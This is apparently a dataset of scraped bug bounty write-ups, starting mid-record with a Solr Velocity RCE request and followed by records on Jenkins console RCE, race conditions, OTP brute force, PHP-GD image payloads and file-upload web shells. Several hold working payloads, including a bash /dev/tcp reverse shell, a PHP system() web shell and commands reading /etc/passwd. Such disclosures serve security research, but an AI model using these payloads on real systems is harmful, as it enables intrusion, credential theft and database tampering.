+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27)) +%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27)) +$ex.waitFor()+%23set($out=$ex.getInputStream()) +%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: tide90.microsoft.com:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 0 That’s all to get an RCE on microsoft.com subdomain, you can read more on it via following the CVE ID, Reviews about Microsoft Bug Bounty Program: I won’t really suggest participating in Microsoft Bug Bounty if you’re going for web assets Bounty as it’s kinda confusing when it comes to scope and no bounties for most of it.. Anyway it was fun one, thanks for reading. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty BugBounty POC RCE Recon vulnerability MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 3 replies on “Microsoft Apache Solr RCE Velocity Template | Bug Bounty POC” Guide 001 | Getting Started in Bug Bounty Hunting.. - Muhammad Khizer Javed says: February 4, 2021 at 6:19 pm […] Microsoft Apache Solr RCE Velocity Template By Muhammad Khizer Javed […] Loading... Reply Ali Hassan Ghori says: April 4, 2020 at 4:50 pm Good work, as always. You are motivation. Loading... Reply Muhammad Khizer Javed says: April 4, 2020 at 5:22 pm Thanks a lot man 🙂 Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Playing with JSON Web Tokens for Fun and Profit Previous Getting Started in Android Apps Pen-testing (Part-1) You may also like January 16, 2018 by KNOXSS for Dummies! A new Detailed Guide to use KNOXSS Pro in real world Just “XSS” it Hello to all my brothers and friends. First i would like to thank @knowledge_2014 (ak1t4 z3n) for his support and @IfrahIman_ (Ifrah Iman) for helping to write this... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More September 8, 2018 by MuhammadKhizerJaved SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC Hey Guys, So Another Concise Report about an SQLi I recently Found One day i was just going through some Twitter posts and saw one of my friend replied... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 3 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@sw33tlie/finding-a-p1-in-one-minute-with-shodan-io-rce-735e08123f52", "title": "Finding a P1 in one minute with Shodan.io (RCE) | by sw33tLie | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sw33tlie/finding-a-p1-in-one-minute-with-shodan-io-rce-735e08123f52. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFinding a P1 in one minute with Shodan.io (RCE) | by sw33tLie | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Finding a P1 in one minute with Shodan.io (RCE) sw33tLie 2 min read · Mar 11, 2020 -- 1 Listen Share What could possibly be better than Finding a P2 in two minutes with Shodan.io ? Easy answer: higher severity, less time! As usual, I was looking for random servers on Shodan , owned by a company which had a bug bounty program that I was targeting. After a while I came across a few Jenkins instances which were in-scope. The first one was pretty boring, it seemed up-to-date and there were no public exploits that could have been useful. The second instance, though, was much more interesting. Although it was up-to-date as well, just like the previous one, there was a link to create new accounts in the login screen. It looked like this: At this point I tried to sign up and it worked flawlessly. After logging in, I was able to see everything: usernames, build history and so on. I could have reported this finding by now, but since in Jenkins there’s an easy way to run commands on the server I had to try it! To do that, I went to jenkins-subdomain.redacted.com/script. Here there was a console where I could write commands and execute them: Press enter or click to view image in full size In the picture above you can see the output of the ls command ( “ls /”.execute().text ), which returned as output the folders in the server’s root directory. RCE! Lessons learned You may be wondering how a company running a bug bounty program could let a Jenkins instance misconfigured in such a bad way. In this case, I believe that the developer who installed Jenkins thought that running it on a non-standard port was enough to hide it from the whole internet. Unfortunately for him, search engines like Shodan have proved that’s a faulty assumption which should never be made: security by obscurity never worked, and never will. Thank you for reading, for more writeups and infosec-related news you can follow me on Twitter ( @sw33tLie ). Infosec Bug Bounty Program Bug Bounty Jenkins Shodan Unlisted -- -- 1 Written by sw33tLie 257 followers · 2 following Bug bounty hunter Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@valeriyshevchenko/how-to-check-race-conditions-in-web-applications-338f73937992", "title": "How to check Race Conditions in Web Applications | by Valeriy Shevchenko | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@valeriyshevchenko/how-to-check-race-conditions-in-web-applications-338f73937992. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow to check Race Conditions in Web Applications | by Valeriy Shevchenko | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How to check Race Conditions in Web Applications Valeriy Shevchenko 2 min read · Jun 27, 2017 -- 4 Listen Share Press enter or click to view image in full size This is not a terrible story of one hack. May be in a future there will be more terrible things. But not now. This is more instruction to action. Often, what you do not use is very quickly forgotten. So here I decided to write something to remember and share with you. So what does it mean — race condition? It’s very common bug for websites with balances, vouchers or other limited resources (mostly money). A race condition occurs when multiple threads simultaneously access the same shared code, variables, files, etc. without locking or synchronization, resulting in inconsistency of the output. Just imagine that you can transfer your money from one account to another without loosing money from first account. And yes, it's not a joke. It's real. For example some years ago Egor Homakov has published story about race condition in Starbucks Caffe. He posted his story here . It's insane. As he said: \"I could create a simple bunch of fake gift cards bought around the world, silently generate credits on them and sell Starbucks credits online for Bitcoin with, say, 50% discount. It would easily make me a couple of millions of dollars unless Starbucks actually tracks gift card balances.\" How can we check it? Usually I use a Burp Suit. Here a couple of screenshot how to. Catch you request with Burp Suit Proxy. And with context menu Send to Intruder this request . Press enter or click to view image in full size 2. Go to Options menu. Here we choose number of threads: 25 . It's better to use 25 (the default value is five) because we want to send many simultaneous requests. 3. Go to Payloads menu. Here we should use Payload type: Null payloads , because we are going to replay the request as it is. And after this simple steps we can start the intruder attack and observe the results. Simple actions — great consequences. Racecondition Web App Security Web App Development -- -- 4 Written by Valeriy Shevchenko 1.91K followers · 151 following I am a guy passionate about testing and security researching 👨‍💻 → t.me/valyaroller Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ranjitsinghnit/otp-bruteforce-account-takeover-faaac3d712a8", "title": "OTP Bruteforce- Account Takeover. This is my first 4 digit bounty in $$$$… | by Th3Y0ungM0nk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ranjitsinghnit/otp-bruteforce-account-takeover-faaac3d712a8. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nOTP Bruteforce- Account Takeover. This is my first 4 digit bounty in $$$$… | by Th3Y0ungM0nk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in OTP Bruteforce- Account Takeover Th3Y0ungM0nk 3 min read · Mar 29, 2020 -- 1 Listen Share This is my first 4 digit bounty in $$$$ and was really excited when I discovered a simple yet critical vulnerability in one of the private programme. This attack is very similar to https://thehackernews.com/2016/03/hack-facebook-account.html only difference is that the attack was on the login functionality itself . Login mechanism : Enter the mobile no , user receives an otp . Enter the otp and login into the webapplication. Flaw was that rate limiting was not on place and thus gave an attacker endless opportunities to brute force a 6-digit code and login into any account. Response for Valid OTP Press enter or click to view image in full size Response for Invalid Otp Press enter or click to view image in full size So , now we had two different responses for a valid and an invalid otp that were processed during the authentication process. I curiously validated in intruder if rate limiting was present or not and if it can be bypassed — just following the bug hunting strategy (doubt on everything that is in front of you). And NO RATE LIMITING even after 50 wrong attempts :) I could have exploited it in intruder , but because most of the programme handlers are not expert in information security and may/may not have idea of BurpSuite/Intruder — I decided to write up an exploit (which I always love to present things to give the enduser a fair idea on the other side that how in real world it can be exploited) Exploit Code (This was something similar-with few omitted part) Press enter or click to view image in full size Fire up the exploit and bruteforce OTP . Press enter or click to view image in full size Note : Images are just for demo purpose and very much identical to the actual one , I can’t share the original poc exploit or screenshots. And voilla, after certain hundred iterations we were able to login into the app. I have hidden the cookie part from exploit code which actually was finally replaced in browser using cookie editor EditThisCookie — https://github.com/ETCExtensions/Edit-This-Cookie and account takeover was completed. I quickly created the POC , sent it and was triaged within hours and fixed in a day! This was my highest bounty and has boosted my morale to explore this beautiful world of bug hunting. Bug Hu Bug Bounty Infosec Security -- -- 1 Written by Th3Y0ungM0nk 55 followers · 30 following I break things :) Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43", "title": "RACE Condition vulnerability found in bug-bounty program | by Pravinrp | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRACE Condition vulnerability found in bug-bounty program | by Pravinrp | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in RACE Condition vulnerability found in bug-bounty program Pravinrp 2 min read · Jun 13, 2020 -- 1 Listen Share Press enter or click to view image in full size I have recently identified RACE condition vulnerability in Bug bounty program. Description: A race condition attack happens when a computing system that’s designed to handle tasks in a specific sequence is forced to perform two or more operations simultaneously. Eventually, the application is forced to perform unintended actions. This leads the application to security exploitation. Please check below links to get to know more about this bug: Race Condition A race condition attack happens when a computing system that's designed to handle tasks in a specific sequence is… www.veracode.com Attack scenario: Normally, the admin user is authorized to create ONLY 3 three members in his/her team. However, I have successfully managed to create 4 team members using RACE condition vulnerability. Steps that I followed: Click on add team member request and captured the request using burp suite Press enter or click to view image in full size Captured add team member request using burp 2.” E-mail and name” have been taken as the parameter and used for race condition attack. 3. Next, we need to configure the intruder options to stimulate RACE condition attack. First, we need to provide the parameter values as shown in the screenshot. Press enter or click to view image in full size 3. Now, we need to make changes to the number of threads for execution. It is highly crucial because it will speed up sending the requests to the server. Press enter or click to view image in full size Intruder configuration to stimulate the attack 4. Now click on “Start attack” in intruder option. Burp will initiate sending requests simultaneously to the server. As a result of this attack, I was successfully able to add 4 team members. Now, totally I have 4 team members in my team. Press enter or click to view image in full size 4 team members added to my team due to RACE condition attack If you like the blog, please share and like it. Happy Hacking!! If you like the content, please follow me on medium and LinkedIn LinkedIn: https://www.linkedin.com/in/pravin-r-p-oscp-28497712b/ Bug Bounty Hacking -- -- 1 Written by Pravinrp 955 followers · 15 following OSCP/Security geek &researcher(Application/infrastructure/Mobile/cloud security) Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada", "title": "Remote Image Upload Leads to RCE (Inject Malicious Code to PHP-GD Image) | by asdqw3 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRemote Image Upload Leads to RCE (Inject Malicious Code to PHP-GD Image) | by asdqw3 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Remote Image Upload Leads to RCE (Inject Malicious Code to PHP-GD Image) asdqw3 5 min read · Mar 21, 2020 -- 2 Listen Share Inject Malicious Code to PHP-GD Image بسم الله الرحمن الرحيم I recently came across a web application with two methods for adding images to its media library: local file upload and remote file upload from a stock photo website. My first thought was to check for an SSRF vulnerability through the remote file upload feature, but I decided to start by testing the local file upload. After several tests, I found that the app only allowed image files (.jpg, .png, .gif, and .svg). The .svg format could potentially lead to XSS, but that wasn’t my focus this time. Moving on to the remote file upload feature, I intercepted a request while adding an image. The request included three POST form-data fields: name, url, and photoId. I tried changing the url to my server, but got an Internal Server Error response with no incoming connection. Removing the photoId data resulted in the same error, but this time I got an incoming connection on my server. This was likely due to the lack of a valid image file at the provided url. Next, I provided a url with a valid jpg image file, which successfully uploaded to the media library. Interestingly, when I modified the “name” form-data to image.html and image.php, both uploads were successful. I quickly realized that injecting PHP scripts into image exif metadata wouldn’t work because the app recreated the fetched image file using the PHP-GD library, which removes exif metadata. However, I found several articles suggesting that it’s still possible to inject PHP scripts into images that won’t be removed after processing. https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif Developer uses GD (or Imagemagick) library in order to prevent image header script execution by recreating the image… github.com BookFresh Tricky File Upload Bypass to RCE Hello all today i'm going to write about an interesting vulnerability i've found in Square's Acquisition website… secgeek.net These methods are limited to a few characters, though. Also there is payload injector created by dlegs. dlegs/php-jpeg-injector Injects php payloads into jpeg images. Related to this post. You have a web application that runs a jpeg image through… github.com First attempt, I use dlegs tool to inject payload to .jpg image. You need to recreate a .jpg image with php-gd first then inject the payload with gd-jpeg.py $ php gd.php image.jpg image-gd.jpg Then inject the payload to image-gd.jpg $ python gd-jpeg.py image-gd.jpg ‘<?php phpinfo()?>’ image-gd-poc.jpg To make sure the injected payload working, try re-create the image-gd-poc.jpg with php-gd. $ php gd.php image-gd-poc.jpg image-gd-poc-1.jpg Then compare binary image-gd-poc.jpg and image-gd-poc-1.jpg I use vbindiff to compare both image. $ vbindiff image-gd-poc.jpg image-gd-poc-1.jpg Press enter or click to view image in full size The injector writed by dlegs will inject your provided payload into a .jpg image file. This is only working if your target app recreate the image with default quality (default -1). Unfortunately, this method failed because the target app converted images with a quality setting of 90, removing the injected payload. My next attempt used a .gif image payload by @ABOUL3LA . This time, I successfully uploaded the POC.gif file and renamed the form-data “name” to test.php, resulting in code execution. On his article he provided POC.gif image that already injected with <?phpinfo()?>. Finally, this is what I got after upload POC.gif and renaming the form-data “name” to test.php Press enter or click to view image in full size If you want to use POC.gif payload by @ABOUL3LA the target app must have short_open_tag=On set in php.ini, otherwise the php script won’t executed and you have to modify the payload with <?php ?> tag to make it work. I reported this vulnerability to the bug bounty program, and they triaged it within minutes, patching it in just a few hours. I explore bit more into the php-gd lib, just want to know how many bytes we can inject to image. After several testing on different .jpg and .gif image, I can conclude that .jpg image can be injected with payload up to 13 bytes, but .gif image could be injected with more bytes. GIF image that could be injected is GIF image that has null byte blocks. I found out that GIF images with Netscape Looping Application Extension have this null byte blocks. Netscape Looping Application Extension is the most popular Application Extension Block that tells browser or other GIF viewer to loop the entire animated GIF file. http://www.vurdalakov.net/misc/gif/netscape-looping-application-extension This is example GIF image that has Netscape Looping Application Extension https://media2.giphy.com/media/6NjZoOdEbXs1W/source.gif If we recreate the GIF image with php-gd, the null byte blocks not removed. Look at binary comparison between original gif and gd gif below. Press enter or click to view image in full size So let’s try inject php shellcode to this null byte blocks and recreate the GIF image with PHP-GD, this is the binary comparison: Press enter or click to view image in full size The injected payload remain there. Then you can upload the gif image to your vulnerable target app. Press enter or click to view image in full size You can get the GIF Injector and other scripts here: https://gist.github.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b MRM The latest Tweets from MRM (@agamimaulana). asdqwe. Indonesia twitter.com Php Gd Rce -- -- 2 Written by asdqw3 148 followers · 0 following https://twitter.com/agamimaulana Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3", "title": "Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) | by YoKo Kho | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) | by YoKo Kho | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) YoKo Kho 8 min read · Sep 14, 2019 -- 2 Listen Share بسم الله الرحمن الرحيم - Part I from (hopefully) IV Parts - Update I: Added a “Reference” Section. Update II: “We” at this series of article will refer to Faisal Yudo Hernawan , Tomi , and Me. Update III: The way to exploiting the “upload.php” function has been released at Tomi’s write-up . It could be bypass with the .phtml extension. I. INTRODUCTION 1.1. Few Words about this Write-Up As an information, this simple write-up talks about a story related how I chained few bugs at one of private program, which is from a simple recon to simple SQL Injection, Race Condition, and finally lead to an RCE. Since the found RCE is little unique, then, this simple write-up will begin from an RCE that triggered from Race Condition. InshaAllah, the other will be released later. 1.2. Simple Summary Some reader maybe feels more comfortable with a summary. Then at this section, we will explain the whole summary related our “journey” to get an RCE. While we got an access into the internal dashboard of administrator (by using the account that has been dump from SQL Injection Result), then we found out the upload feature in the app. Basically, this app has a protection for not giving any permission to users to upload the .php extension (let’s say, the function is upload.php - previously, it was vulnerable by uploading the .phtml extension). But then, the first unique issue is come when this application provides another function (let’s called, modify.php ) that could be used to replace / deleteing the previous uploaded file. The good one is, this modify.php function is not designed to filtering any extension just like the upload.php did. So, we could easily to upload the .php file into the site. But then, the problem for us exists when the app moving out the uploaded file into the S3 bucket. In other words, it’s not possible then to get an RCE at the app’s server since the shell is stored at S3 bucket (and didn’t work too). At one condition, then we tried to re-send the upload request (by using those modify.php function) multiple times (it just like a race condition) and suddenly we got a different response length that contain an error with local stored path information. From this execution, then we realized if the file was stored locally around 2 seconds before its automatically moving into the S3 bucket. So, the next is, we setup the listener at our server (by simply using an “nc -lvp listener_port”), and then tried to conduct the same race condition again (with re-uploading the reverse shell at the modify.php function) and finally in parallel, we request the found local stored path previously at the our browser (it just like, we press the “Command + R” multiple times) until our terminal showing up the shell from the app’s server. After several request (somehow more than 20–30 requests), then finally we got a shell of the app’s server. Press enter or click to view image in full size Figure 1 RCE Result II. THE DETAIL STORY ABOUT THE RCE At this section, we will try to explain in step by step about how finally we got an RCE. FYI, we tried to sketch the interface manually as best as we can, so hopefully could help the readers to see the situation. 2.1. Facing the Internal Dashboard — Meet the Upload Function So, after we got an access into the internal dashboard (will be released later about how we got it), we didn’t stop hunting. At this point, then we tried to look any file upload feature that maybe exist at the app. After few minutes, then we finally found a feature that could be used to publish a news/article via this dashboard. And then, we learn that if every file that we would like to upload to every available section (news/article or anything), then it will be procced by the function called upload.php. Basically, every available section will have an upload interface like this: Press enter or click to view image in full size Figure 2 Interface of Upload Feature Without thinking too much, then we directly upload the simple .php shell again via this feature ( previously, it was vulnerable by giving the .phtml extension and fixed. Then we tried to test this feature again). But things aren’t going well, the feature has a protection to filter the .php extension. We tried to combining the extension with upper & lower case (ex: .PhP), also added some number behind the extension (ex: .php3), and tried various way (as far as we know — doubling the extension, null character, added ; character, and more) to bypass the protection, then it failed. We always got this lovely warning. Press enter or click to view image in full size Figure 3 Protection at the Application Then we think, how about the stored XSS, such as maybe upload the .html, .xml, or .svg format? Well, this one is successfully uploaded. But then, we realized if the file was moving out into the S3 bucket. Then, what’s the point if we could trigger the XSS but at the S3 bucket domain? Well, since we have no idea to “using” it further, then we assume if this one is not an issue. 2.2. Meet the Second Upload Function, Modify.php What’s next? After we have no idea about how to “use” the “uploaded” file into the S3 bucket, then we back into first page of “news” section that contain so many forms to be add with the new content. After looking it carefully, then we realized if there is an “edit” button at the same row with the legitimate file that uploaded into the S3 bucket. Press enter or click to view image in full size Figure 4 Function Edit / Delete the Uploaded File At this point, we try to click the “edit” button and trying to see what will happened. Just as expected, then we will face the upload feature too at this section. At the first time we see it, we think that this form is filtering the .php extension too (since we thought, how can it could be different with the first one?). But, surprisingly , this upload feature doesn’t filter any extension yet. In short, we could upload the .php file directly without meet any trouble. Press enter or click to view image in full size Figure 5 Upload Feature to Replacing the Existing File When our shell has been uploaded, then we try to re-upload the shell and find out the function that used. If this one doesn’t have any filter feature yet, then high possibility if this is the different function as previous. And our assumption is correct. The function that used at this endpoint is “ modify.php ”, not “ upload.php ”. Here is the sample request that made with “modify.php”: Content-Disposition: form-data; name=\"fileid\" 31337 -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"name\" picture-1.png -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"description\" -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"userfile\"; filename=\"reverse.php\" Content-Type: text/php <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'\"); -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"save\" Save So, is it finish? So sad, not yet . The .php file is also moving out into the S3 bucket and we can’t do anything with the uploaded file. 2.3. Race Condition to Get the Local Path To be honest, at that time, we have no idea anymore, until we finally try to send the request multiple times with “null” payloads (via intruder mode at burpsuite). Please kindly don’t ask, why we do that. Surprisingly, after several request has been made, we got a different response length (somehow need around 10 requests, somehow more than 20–30 requests). If the normal request will result to 1147 response lengths, at one point, it hits 1710 response lengths. Here is the sample of the “same” multiple request that we did: Press enter or click to view image in full size Figure 6 Sending Multiple Request with Null Payload And here is the normal response that we will get normally (1147 response lengths): Press enter or click to view image in full size Figure 7 Normal Response with 1147 Response Lengths So, what is the content from the un-normal response length that we got? The good one, it reveals the local path of the file. Press enter or click to view image in full size Figure 8 The Race Condition has Reveals the Local Path When we see this result, then finally we thought if we just need to access the path at the browser and waiting for the listener triggering up the shell. But once again, so sad, it not like that. When access the file via our browser, we got the famous alert, which is: “File not Found” . And if we check the path of the file that has been uploaded, it still showing the S3 bucket location, not the local path that we got from this error. So, from this execution, we learn if the file is somehow was stored locally around 1–2 seconds before they move it automatically into the S3 bucket. 2.4. Triggering the Shell and Got an RCE From the last assumption, then there is one thing that come up at our mind: “ how if we run the race condition again, and at the same time, we request the local path that we found (from the error result) to our browser to triggering the reverse shell? ” How is it? Finally, this trick works well . So, we setup the listener at our server -> then try to replacing the existing file at the app with our reverse shell -> conduct the race condition multiple times (1,000 requests could buffer our time) -> take the local path from the different response length from race condition execution -> repeatedly access the path via our browser -> and when the app is hit by the race condition again, then the shell will be triggered into our listener. Here is the simple flow related the execution: Press enter or click to view image in full size Figure 9 Flow of the Execution And here is the simple result from the RCE: Press enter or click to view image in full size Figure 10 RCE Result III. THE CLOSING Much things (at least, for us) that we could learned from this bug. Few of the good things are: There is a possibility for us to get the local path of the uploaded file before the file itself is moving out into the S3 bucket. Even only 1 or 2 seconds, then its enough for us to triggering the shell into our listeners; Always try to edit your own uploaded file. From this case, we seen that if there is a possibility if the upload feature is executed from two separate function (which is the upload.php and modify.php in this situation); And maybe much more that we don’t know yet. IV. REFERENCES Here are some references that (hopefully) relevant with this write-up: https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010) https://securingtomorrow.mcafee.com/business/testing-race-conditions-web-applications/ https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e https://www.owasp.org/index.php/Unrestricted_File_Upload https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Infosec Race Condition Rce File Upload -- -- 2 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125", "title": "Uploading Backdoor For Fun And Profit. | by Mohammed Abdul Raheem | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUploading Backdoor For Fun And Profit. | by Mohammed Abdul Raheem | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Uploading Backdoor For Fun And Profit. Mohammed Abdul Raheem 4 min read · Feb 17, 2020 -- 1 Listen Share Hi folks, After a long time decided to share something to gain knowledge. The website was a crypto trading platform and i was looking for P1. For those who always worry to find P1's, here are few things you should look at. Chaining of bugs + Impact to whole application/server + Difficult to Exploit? Make it easily exploitable ;) Here is the one to learn single click exploits https://vulnerabilities.in/blog/ Logging into the application have functionality “File Upload” If i want to find RCE the first thing comes to my mind is to play with file upload functionality. There are many other ways to find RCE. This will be helpful https://medium.com/@ozguralp/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311 Let’s direct to the POC — Application allows users to upload only image files, i tried uploading html, php files but i was restricted to upload such files. Press enter or click to view image in full size Then what? Lets Bypass.. I tried changing file type .php to phps, phpt, php3, php4, php5, php.jpg etc.. and also tried Googling for “ file upload bypasses hackerone ” and learned very good reports, then a thought comes to my mind “ how images are getting validated? ” I saw content-disposition and content-type headers while uploading files. I tried playing with these headers, removed both content-disposition and content-type headers to check if these are checking at server side. Yes! it was checking at server side and i was not able to upload images without content headers. To be professional we should learn how things are working. “ first learn it then break it ” with this thought i started learning things from OWASP file upload bypasses https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload and the bypass was available in OWASP sheet. Tried uploading png > Captured request with burp > Changed Content-Type: image/png to Content-Type: text/html Press enter or click to view image in full size Bypassed! The content-type header was checking at server side but there was no header validation so i was able to bypass file upload functionality. Checking — if http request comes with these headers. validation — what value should come with these headers. File Upload? Bypassed..!! RCE? Let’s see… Uploaded php file with code inside <?php phpinfo(); ?> (php file upload > right click > view image > phpinfo page) — Remote Code Execution! Now Uploaded php file with code inside <?php echo system($_GET[\"cmd\"]); ?> (php file upload > right click > view image > https://TargetSite.com/logo/216.php > added ?cmd=whoami; id; uname -a > https://TargetSite.com/logo/216.php?cmd=whoami; id; uname -a) Press enter or click to view image in full size Code Execution when i tried to look /etc/passwd file, i was getting a blank page in response. (https://TargerSite.com/logo/216.php?cmd=cat /etc/passwd > blank page). Don’t know why i was not able to read /etc/passwd file. Thought there might be restrictions. Thanks to this nigga Muhammad Khizer Javed for this blog https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/ While reading his blog i saw ‘+’ after “ cat command ” and then able to see /etc/passwd file. https://TargetSite.com/logo/216.php?cmd=cat+/etc/passwd > Bingo! Press enter or click to view image in full size /etc/passwd Done? No! Explore more… Looking at the file shows ‘MySQLServer’ is running behind, thought to try something fishy! Uploaded c99 shell and found many sensitive files. Here is the one… db-credentials Now logged in to database with credentials > found my account in users table > Able to add BTC’s to my account. Added BTC? No! Reported? Yes! Rewarded? Yes! :) But.. I heard saying people “ RCE is not a direct vulnerability, it is the end result of a vulnerability ” Press enter or click to view image in full size But to be clear, Remote code Execution is not the end, if you finds RCE in bug bounty program then first think what you can do with it. Example : As this was a crypto trading platform, found db-credential > logged in to database > found myself in users table > able to add a lot of BTC’s to my account. P1 ¯\\_(ツ)_/¯ Also after “ Remote Code Execution ” we can go for “Privilege Escalation” 